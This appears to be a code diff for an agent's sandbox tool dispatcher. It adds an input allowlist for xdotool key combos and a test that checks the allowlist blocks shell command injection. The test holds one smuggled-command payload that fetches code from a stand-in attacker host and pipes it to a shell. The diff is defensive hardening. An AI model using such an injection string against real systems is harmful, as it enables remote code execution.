@@ -160,6 +160,15 @@ pub async fn dispatch(
                 .get("combo")
                 .and_then(|v| v.as_str())
                 .unwrap_or("Return");
+            if combo.is_empty()
+                || !combo.chars().all(|c| {
+                    c.is_ascii_alphanumeric() || matches!(c, '+' | '_' | '-' | '[' | ']' | ':')
+                })
+            {
+                return ToolResponse::error(format!(
+                    "invalid or unsafe key combo: '{combo}'. Must only contain alphanumeric characters, '+', '_', '-', ':', and brackets"
+                ));
+            }
             sh(ctx, target, screen, &format!("xdotool key {combo}")).await
         }
         "browse" => {
@@ -513,5 +522,31 @@ mod tests {
         assert_eq!(decoded["url"], tricky_url);
         assert_eq!(decoded["selector"], tricky_selector);
         assert_eq!(decoded["stealth"], true);
+    }
+
+    #[tokio::test]
+    async fn key_combo_rejects_unsafe_characters() {
+        let docker = DockerClient::new(None).unwrap();
+        let ctx = ToolContext {
+            docker: &docker,
+            public_host: "localhost".into(),
+            agent: None,
+        };
+
+        // Command injection attempt should be rejected before shell execution
+        let bad_payload = serde_json::json!({
+            "combo": "Return; curl attacker | sh",
+            "screen": 0,
+        });
+        let resp = dispatch(&ctx, "key", &bad_payload, "test-sandbox").await;
+        assert!(resp.is_error);
+        assert!(format!("{:?}", resp.content).contains("invalid or unsafe key combo"));
+
+        let empty_payload = serde_json::json!({
+            "combo": "",
+            "screen": 0,
+        });
+        let resp2 = dispatch(&ctx, "key", &empty_payload, "test-sandbox").await;
+        assert!(resp2.is_error);
     }
 }
